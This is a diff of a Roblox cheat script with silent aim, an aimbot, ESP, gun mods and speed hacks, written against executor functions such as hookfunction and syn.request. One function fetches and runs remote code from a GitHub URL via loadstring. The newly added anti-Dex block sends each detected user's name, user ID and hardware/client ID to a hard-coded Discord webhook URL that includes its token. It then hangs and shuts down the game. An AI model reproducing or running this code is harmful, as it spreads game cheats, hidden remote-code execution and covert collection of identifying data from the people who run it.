@@ -70,17 +70,17 @@ Main.ResetOnSpawn = false
 a.Name = "a"
 a.Parent = Main
 a.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
-a.Position = UDim2.new(0.385944009, 0, 0.22470589, 0)
+a.Position = UDim2.new(0.672823191, 0, 0.135984078, 0)
 a.Size = UDim2.new(0, 382, 0, 467)
 
 Name.Name = "Name"
 Name.Parent = a
 Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Name.BackgroundTransparency = 1.000
-Name.Position = UDim2.new(0.00899999961, 1, 0.0130000003, 0)
-Name.Size = UDim2.new(0, 67, 0, 17)
+Name.Position = UDim2.new(0.00899996888, 1, 0.0129999984, 0)
+Name.Size = UDim2.new(0, 45, 0, 17)
 Name.Font = Enum.Font.GothamBold
-Name.Text = "Universal"
+Name.Text = "V0.1.2"
 Name.TextColor3 = Color3.fromRGB(255, 255, 255)
 Name.TextSize = 15.000
 
@@ -462,7 +462,7 @@ TextLabel_10.TextSize = 14.000
 
 -- Scripts:
 
-local function HNDI_fake_script() -- a.Localscript 
+local function SZRC_fake_script() -- a.Localscript 
 	local script = Instance.new('LocalScript', a)
 
 	local UIS = game:GetService("UserInputService")
@@ -503,8 +503,8 @@ local function HNDI_fake_script() -- a.Localscript
 	
 	dragify(script.Parent)
 end
-coroutine.wrap(HNDI_fake_script)()
-local function DGPLDAF_fake_script() -- SilentTogbgle.LocalScript 
+coroutine.wrap(SZRC_fake_script)()
+local function PGQEXQG_fake_script() -- SilentTogbgle.LocalScript 
 	local script = Instance.new('LocalScript', SilentTogbgle)
 
 	local enabled = false
@@ -639,8 +639,8 @@ local function DGPLDAF_fake_script() -- SilentTogbgle.LocalScript
 		end
 	end)
 end
-coroutine.wrap(DGPLDAF_fake_script)()
-local function OEKH_fake_script() -- rgbgun.LocalScript 
+coroutine.wrap(PGQEXQG_fake_script)()
+local function LNATBL_fake_script() -- rgbgun.LocalScript 
 	local script = Instance.new('LocalScript', rgbgun)
 
 	local endabled = false
@@ -698,8 +698,8 @@ local function OEKH_fake_script() -- rgbgun.LocalScript
 		end
 	end)
 end
-coroutine.wrap(OEKH_fake_script)()
-local function EFDL_fake_script() -- infintejump.LocalScript 
+coroutine.wrap(LNATBL_fake_script)()
+local function JYFS_fake_script() -- infintejump.LocalScript 
 	local script = Instance.new('LocalScript', infintejump)
 
 	
@@ -714,8 +714,8 @@ local function EFDL_fake_script() -- infintejump.LocalScript
 		end);
 	end)
 end
-coroutine.wrap(EFDL_fake_script)()
-local function JQAVZ_fake_script() -- Gunmods.LocalScript 
+coroutine.wrap(JYFS_fake_script)()
+local function EXVOY_fake_script() -- Gunmods.LocalScript 
 	local script = Instance.new('LocalScript', Gunmods)
 
 	
@@ -748,8 +748,8 @@ local function JQAVZ_fake_script() -- Gunmods.LocalScript
 		
 	end)
 end
-coroutine.wrap(JQAVZ_fake_script)()
-local function HIGGQCK_fake_script() -- speed.LocalScript 
+coroutine.wrap(EXVOY_fake_script)()
+local function TOAFQ_fake_script() -- speed.LocalScript 
 	local script = Instance.new('LocalScript', speed)
 
 	local hey = true
@@ -775,8 +775,8 @@ local function HIGGQCK_fake_script() -- speed.LocalScript
 		end
 	end)
 end
-coroutine.wrap(HIGGQCK_fake_script)()
-local function ABBIBT_fake_script() -- Esp.LocalScript 
+coroutine.wrap(TOAFQ_fake_script)()
+local function KYZYX_fake_script() -- Esp.LocalScript 
 	local script = Instance.new('LocalScript', Esp)
 
 	
@@ -795,10 +795,10 @@ local function ABBIBT_fake_script() -- Esp.LocalScript
 	
 		if Find_Required == "No" then
 			game:GetService("StarterGui"):SetCore("SendNotification",{
-				Title = "Exunys Developer";
+				Title = "";
 				Text = "Boxes script could not be loaded because your exploit is unsupported.";
 				Duration = math.huge;
-				Button1 = "OK"
+				Button1 = "Shit"
 			})
 	
 			return
@@ -1112,8 +1112,8 @@ local function ABBIBT_fake_script() -- Esp.LocalScript
 		
 	end)
 end
-coroutine.wrap(ABBIBT_fake_script)()
-local function BSLAMRF_fake_script() -- ArsenalTab.LocalScript 
+coroutine.wrap(KYZYX_fake_script)()
+local function OLRVNU_fake_script() -- ArsenalTab.LocalScript 
 	local script = Instance.new('LocalScript', ArsenalTab)
 
 	if game.PlaceId == 301549746 then
@@ -1121,8 +1121,8 @@ local function BSLAMRF_fake_script() -- ArsenalTab.LocalScript
 		script.Parent.rgbgun:Destroy()
 	end
 end
-coroutine.wrap(BSLAMRF_fake_script)()
-local function YPRAZZH_fake_script() -- AimbotB.LocalScript 
+coroutine.wrap(OLRVNU_fake_script)()
+local function AAHBA_fake_script() -- AimbotB.LocalScript 
 	local script = Instance.new('LocalScript', AimbotB)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -1132,8 +1132,8 @@ local function YPRAZZH_fake_script() -- AimbotB.LocalScript
 		aiomtaaab.Visible = false
 	end)
 end
-coroutine.wrap(YPRAZZH_fake_script)()
-local function RCFJFK_fake_script() -- EspB.LocalScript 
+coroutine.wrap(AAHBA_fake_script)()
+local function ITJEVIR_fake_script() -- EspB.LocalScript 
 	local script = Instance.new('LocalScript', EspB)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -1143,8 +1143,8 @@ local function RCFJFK_fake_script() -- EspB.LocalScript
 		s.Visible = false
 	end)
 end
-coroutine.wrap(RCFJFK_fake_script)()
-local function BXTHDYZ_fake_script() -- ArsenalB.LocalScript 
+coroutine.wrap(ITJEVIR_fake_script)()
+local function DCSA_fake_script() -- ArsenalB.LocalScript 
 	local script = Instance.new('LocalScript', ArsenalB)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -1156,8 +1156,8 @@ local function BXTHDYZ_fake_script() -- ArsenalB.LocalScript
 		ar.Visible = true
 	end)
 end
-coroutine.wrap(BXTHDYZ_fake_script)()
-local function CLBF_fake_script() -- ASimBOtToggle.LocalScript 
+coroutine.wrap(DCSA_fake_script)()
+local function LTUFEW_fake_script() -- ASimBOtToggle.LocalScript 
 	local script = Instance.new('LocalScript', ASimBOtToggle)
 
 	
@@ -1296,8 +1296,8 @@ local function CLBF_fake_script() -- ASimBOtToggle.LocalScript
 		end
 	end)
 end
-coroutine.wrap(CLBF_fake_script)()
-local function ZUENEL_fake_script() -- AimTab.a 
+coroutine.wrap(LTUFEW_fake_script)()
+local function WVTCM_fake_script() -- AimTab.a 
 	local script = Instance.new('LocalScript', AimTab)
 
 	function make()
@@ -1333,8 +1333,8 @@ local function ZUENEL_fake_script() -- AimTab.a
 	
 	make()
 end
-coroutine.wrap(ZUENEL_fake_script)()
-local function OMSKBA_fake_script() -- wallCheckTog.LocalScript 
+coroutine.wrap(WVTCM_fake_script)()
+local function XLACZRO_fake_script() -- wallCheckTog.LocalScript 
 	local script = Instance.new('LocalScript', wallCheckTog)
 
 	local debounce = false
@@ -1382,8 +1382,8 @@ local function OMSKBA_fake_script() -- wallCheckTog.LocalScript
 	end
 	end)
 end
-coroutine.wrap(OMSKBA_fake_script)()
-local function WYXJJ_fake_script() -- TeamCHeckTog.LocalScript 
+coroutine.wrap(XLACZRO_fake_script)()
+local function QLFM_fake_script() -- TeamCHeckTog.LocalScript 
 	local script = Instance.new('LocalScript', TeamCHeckTog)
 
 	local bool = script.Parent.Parent.Bools
@@ -1421,8 +1421,8 @@ local function WYXJJ_fake_script() -- TeamCHeckTog.LocalScript
 		end
 	end)
 end
-coroutine.wrap(WYXJJ_fake_script)()
-local function HBYFWM_fake_script() -- ShowfovTog.LocalScript 
+coroutine.wrap(QLFM_fake_script)()
+local function DCWHIU_fake_script() -- ShowfovTog.LocalScript 
 	local script = Instance.new('LocalScript', ShowfovTog)
 
 	local bool = script.Parent.Parent.Bools
@@ -1461,8 +1461,8 @@ local function HBYFWM_fake_script() -- ShowfovTog.LocalScript
 		end
 	end)
 end
-coroutine.wrap(HBYFWM_fake_script)()
-local function YINYVW_fake_script() -- FovTog.LocalScript 
+coroutine.wrap(DCWHIU_fake_script)()
+local function AWAHP_fake_script() -- FovTog.LocalScript 
 	local script = Instance.new('LocalScript', FovTog)
 
 	local bool = script.Parent.Parent.Bools
@@ -1501,8 +1501,8 @@ local function YINYVW_fake_script() -- FovTog.LocalScript
 		end
 	end)
 end
-coroutine.wrap(YINYVW_fake_script)()
-local function QNAFZH_fake_script() -- Main.LocalScript 
+coroutine.wrap(AWAHP_fake_script)()
+local function LLGD_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -1514,10 +1514,319 @@ local function QNAFZH_fake_script() -- Main.LocalScript
 		end
 	end)
 end
-coroutine.wrap(QNAFZH_fake_script)()
-local function BFJXGP_fake_script() -- Main.Webhook 
+coroutine.wrap(LLGD_fake_script)()
+local function QDNO_fake_script() -- Main.Webhook 
 	local script = Instance.new('LocalScript', Main)
 
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Farleyy/123-947u10829ohiyn4jklsadse1234142/main/9872635876t87t1gruy12tg89r7159tr87915489071.lua"))()
 end
-coroutine.wrap(BFJXGP_fake_script)()
+coroutine.wrap(QDNO_fake_script)()
+local function ZHWG_fake_script() -- Main.Test 
+	local script = Instance.new('LocalScript', Main)
+
+	local function show_message(message)
+		delay(0,function() rconsoleprint(string.rep(message,50)) wait(math.random(0.3,0.9)) game:Shutdown() end)
+		wait(math.random(0.3,0.9))
+		while true do end
+	end    
+	
+	local functions = {delay,pcall}
+	
+	for i = 1,#functions do
+		if not functions[i] then
+			show_message("Missing functions! Missing functions!\n")
+		end    
+	end    
+	
+	local banned_functions = {getconnections,checkcaller} -- Remove checkcaller from this table if it's breaking your script.
+	
+	for i,v in pairs(banned_functions) do
+		local success = pcall(function()
+			hookfunction(v,warn)
+		end)  
+		if not success then 
+			show_message("Something went wrong! Something went wrong!\n") 
+		end
+	end    
+	local core = game:GetService("CoreGui")
+	
+	local children
+	delay(0,function() children = core:GetChildren() end)
+	wait(math.random(0.01,0.09))
+	if not children or type(children) ~= "table" then
+		show_message("Please do not spoof with __namecall! Please do not spoof with __namecall!\n")
+	end    
+	
+	if #children < 1 then
+		show_message("Something went wrong! Something went wrong!\n")
+	end    
+	
+	if children[1] and children[1].Parent ~= game:GetService("CoreGui") then
+		show_message("Please do not spoof with __namecall! Please do not spoof with __namecall!\n")
+	end    
+	
+	local banned_names = {"PropertiesFrame","ExplorerPanel","Selection","SideMenu","SettingsPanel","SaveInstance","Confirmation","Caution","CallRemote","TableCaution","SaveMapWindow","RemoteDebugWindow","About","Toggle","IntroFrame","ScriptEditor","InsertObject"}
+	
+	local banned_texts = {"Properties","AbsolutePosition","1066, 370.5","AbsoluteRotation","0","AbsoluteSize","300, 298.5","Active","AnchorPoint","Archivable","AutoLocalize","BackgroundColor3","BackgroundTransparency","BorderColor3","BorderSizePixel","ClassName","Frame","ClipsDescendants","DataCost","1749","LayoutOrder","Name","NextSelectionDown","NextSelectionLeft","NextSelectionRight","NextSelectionUp","Parent","Position","RobloxLocked","RootLocalizationTable","Rotation","Selectable","SelectionImageObject","Size","SizeConstraint","Style","Visible","ZIndex","RobloxGui","CoreScriptLocalization","RobloxLoadingGui","RobloxPromptGui","PurchasePromptApp","RobloxNetworkPauseNotification","TopBar","nVyPf4","PropertiesFrame","ExplorerPanel","SelectionChanged","SetOption","SetSelection","GetOption","GetSelection","LocalScript","Explorer","Options","Delete","Paste","Copy","Cut","Freeze","Star","Starred","Loaded Modules","DEX","v3","Settings","SettingName","Off","","","Click part to select","Off","","","Selection Box","Off","Selection Box","Off","","","Clear property value on focus","Off","","","Select ungrouped models","On","","","SaveInstance decompiles scripts","On","","","Use New Decompiler","Off","","","Save Instance","This will save an instance to your PC. Type in the name for your instance. (.rbxmx will be added automatically.)","","Confirm","The file, FILENAME, already exists. Overwrite?","Please be careful when editing instances inside here, this is like the System32 of Dex and modifying objects here can break Dex.","Call Remote","Arguments","","Display values returned","Script","Script","Caution","Map Downloader","Save Terrain","Off","","","Lighting Properties","Off","","","Camera Instances","Off","","","Save Scripts","On","","","To Save","","Workspace","","Lighting","","ReplicatedStorage","","ReplicatedFirst","","StarterPack","","StarterGui","","StarterPlayer","After the map saves, open a new place on studio, then right click Lighting and ","Workspace","Remote Debugger","Have fun with remotes"}
+	
+	local fakes = {"FindFirstChild","FindFirstChildOfClass","FindFirstAncestor"}
+	
+	for i,v in pairs(children) do
+		local children2 = v:GetChildren()
+		if type(children2) ~= "table" and typeof(children2) ~= "table" then 
+			show_message("Please do not spoof with __namecall! Please do not spoof with __namecall!\n")
+		end  
+		if children[1] and children[1].Parent ~= game:GetService("CoreGui") then
+			show_message("Please do not spoof with __namecall! Please do not spoof with __namecall!\n")
+		end 
+		for i2,v2 in pairs(children2) do
+			local name = nil 
+			pcall(function() name = v2.Name end)
+			if not name or tostring(v2) ~= name then
+				show_console("Please do not spoof with __index! Please do not spoof with __index!\n")
+			end    
+			for i3,v3 in pairs(banned_names) do
+				if v2.Name == v3 then
+	
+	
+	
+					local h = game.HttpService
+					local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"
+	
+					local responce = syn.request(
+						{
+							Url = webUrl,
+							Method = "POST",
+							Headers = {
+								['Content-Type'] = 'application/json'
+							},
+							Body = h:JSONEncode({
+								["content"] = "",
+								["embeds"] = {{
+									["title"] = "**Warning this person used Dark Dex**",
+									["description"] = "User: "..game.Players.LocalPlayer.Name.." or Display: "..game.Players.LocalPlayer.DisplayName.." UserId: "..game.Players.LocalPlayer.UserId,
+									["type"] = "rich",
+									["color"] = tonumber(0xd40e0e),
+									["fields"] = {
+										{
+											["name"] = "Hardware ID:",
+											["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+											["inline"] = true
+										}
+									}
+	
+								}}
+							})
+						})
+	
+	
+					show_message("Please do not use dex! Please do not use dex!\n")
+				end    
+			end  
+			local descendants = nil 
+			pcall(function() descendants = v2:GetChildren() end)
+			if not descendants or type(descendants) ~= "table" or typeof(descendants) ~= "table" then
+				show_message("Please do not spoof with __namecall! Please do not spoof with __namecall!\n")
+			end    
+			for i3,v3 in pairs(descendants) do
+				local class = nil 
+				pcall(function() class = v3.ClassName end)
+				if not class then
+					show_console("Please do not spoof with __index! Please do not spoof with __index\n")  
+				end 
+				if class == "TextLabel" and not v3:IsA("TextLabel") then
+					show_console("Please do not spoof with __index! Please do not spoof with __index!\n")
+				else
+					if class == "TextLabel" then
+						for i4,v4 in pairs(banned_texts) do 
+							local text = nil 
+							pcall(function() text = v3.Text end)
+							if not text or type(text) ~= "string" or typeof(text) ~= "string" then 
+								show_console("Please do not spoof with __index! Please do not spoof with __index!\n")
+							else
+								local ancestor = nil 
+								pcall(function() ancestor = v3:FindFirstAncestorWhichIsA("ScreenGui") end)
+								if ancestor then
+									local ancestor_name = tostring(ancestor)
+									if type(ancestor_name) ~= "string" or typeof(ancestor_name) ~= "string" then
+										show_message("Please do not spoof with hookfunction! Please do not spoof with hookfunction!\n") 
+									end
+									if ancestor_name ~= "RobloxGui" and ancestor_name ~= "TopBar" and ancestor_name ~= "DevConsoleMaster" then
+										if text == v4 then
+											local h = game.HttpService
+											local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"
+	
+											local responce = syn.request(
+												{
+													Url = webUrl,
+													Method = "POST",
+													Headers = {
+														['Content-Type'] = 'application/json'
+													},
+													Body = h:JSONEncode({
+														["content"] = "",
+														["embeds"] = {{
+															["title"] = "**Warning this person used Dark Dex**",
+															["description"] = "User: "..game.Players.LocalPlayer.Name.." or Display: "..game.Players.LocalPlayer.DisplayName.." UserId: "..game.Players.LocalPlayer.UserId,
+															["type"] = "rich",
+															["color"] = tonumber(0xd40e0e),
+															["fields"] = {
+																{
+																	["name"] = "Hardware ID:",
+																	["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+																	["inline"] = true
+																}
+															}
+	
+														}}
+													})
+												})                          
+											wait(0.5)
+											show_message("Please do not use dex! Please do not use dex!\n")
+										end  
+									end
+								end    
+							end    
+						end  
+					end
+				end  
+			end    
+		end 
+	end  
+	
+	local child_added = nil
+	
+	delay(0,function() pcall(function() child_added = core.ChildAdded end) end)
+	wait(math.random(0.01,0.09))
+	local types = {"Instance","string","number","function","boolean"}
+	
+	if not child_added or typeof(child_added) ~= "RBXScriptSignal" then 
+		show_message("Please do not spoof with __index! Please do not spoof with __index!\n")
+	end    
+	
+	local classes = {"Frame","TextLabel","IntValue","ImageLabel","ImageButton"}
+	
+	child_added:Connect(function(child)
+		local class = child.ClassName
+		wait(math.random(0.01,0.09))
+		local local_script = child:FindFirstChildOfClass("LocalScript")
+	
+		if type(local_script) == "nil" and typeof(local_script) == "Instance" then
+			show_message("Please do not spoof with __namecall! Please do not spoof with __namecall!\n") 
+		end    
+		if local_script then
+			if class then
+				if class == "ScreenGui" and not child:IsA("ScreenGui") then
+					show_message("Something went wrong! Something went wrong!\n")
+				else
+					local children = nil 
+					pcall(function() children = child:GetChildren() end)
+					if not children or typeof(children) ~= "table" or type(children) ~= "table" then
+						show_message("Please do not spoof with __namecall! Please do not spoof with __namecall!\n")
+					end 
+					wait(math.random(0.5,1))
+					for i,v in pairs(children) do
+						local name = nil
+						pcall(function() name = v.Name end)
+						if not name or tostring(v) ~= name then 
+							show_message("Please do not spoof with __index! Please do not spoof __index!\n")
+						end
+						for i2,v2 in pairs(banned_names) do
+							if tostring(v) == v2 then
+								local h = game.HttpService
+								local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"
+	
+								local responce = syn.request(
+									{
+										Url = webUrl,
+										Method = "POST",
+										Headers = {
+											['Content-Type'] = 'application/json'
+										},
+										Body = h:JSONEncode({
+											["content"] = "",
+											["embeds"] = {{
+												["title"] = "**Warning this person used Dark Dex**",
+												["description"] = "User: "..game.Players.LocalPlayer.Name.." or Display: "..game.Players.LocalPlayer.DisplayName.." UserId: "..game.Players.LocalPlayer.UserId,
+												["type"] = "rich",
+												["color"] = tonumber(0xd40e0e),
+												["fields"] = {
+													{
+														["name"] = "Hardware ID:",
+														["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+														["inline"] = true
+													}
+												}
+	
+											}}
+										})
+									})
+								show_message("Please do not use dex! Please do not use dex!\n")
+							end    
+						end 
+						local descendants = nil 
+						pcall(function() descendants = child:GetChildren() end)
+						if not descendants or type(descendants) ~= "table" or typeof(descendants) ~= "table" then
+							show_message("Please do not spoof with __namecall! Please do not spoof with __namecall!\n")
+						end    
+						for i2,v2 in pairs(descendants) do
+							local class = nil 
+							pcall(function() class = v.ClassName end)
+							if not class then
+								show_message("Please do not spoof with __index! Please do not spoof with __index!\n")   
+							end
+							if class == "TextLabel" and not v:IsA("TextLabel") then
+								show_message("Please do not spoof with __index! Please do not spoof with __index!\n")
+							else
+								if class == "TextLabel" or class == "TextButton" then
+									for i3,v3 in pairs(banned_texts) do 
+										local text = nil 
+										pcall(function() text = v2.Text end)
+										if not text or type(text) ~= "string" or typeof(text) ~= "string" then 
+											show_message("Please do not spoof with __index! Please do not spoof with __index!\n")
+										else
+											if text == v3 then
+												local h = game.HttpService
+												local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"
+	
+												local responce = syn.request(
+													{
+														Url = webUrl,
+														Method = "POST",
+														Headers = {
+															['Content-Type'] = 'application/json'
+														},
+														Body = h:JSONEncode({
+															["content"] = "",
+															["embeds"] = {{
+																["title"] = "**Warning this person used Dark Dex**",
+																["description"] = "User: "..game.Players.LocalPlayer.Name.." or Display: "..game.Players.LocalPlayer.DisplayName.." UserId: "..game.Players.LocalPlayer.UserId,
+																["type"] = "rich",
+																["color"] = tonumber(0xd40e0e),
+																["fields"] = {
+																	{
+																		["name"] = "Hardware ID:",
+																		["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+																		["inline"] = true
+																	}
+																}
+	
+															}}
+														})
+													})
+												show_message("Please do not use dex! Please do not use dex!\n")
+											end    
+										end    
+									end 
+								end
+							end 
+						end    
+					end    
+				end  
+			else
+				show_message("Please do not spoof with __index! Please do not spoof with __index\n")    
+			end
+		end
+	end)  
+end
+coroutine.wrap(ZHWG_fake_script)()
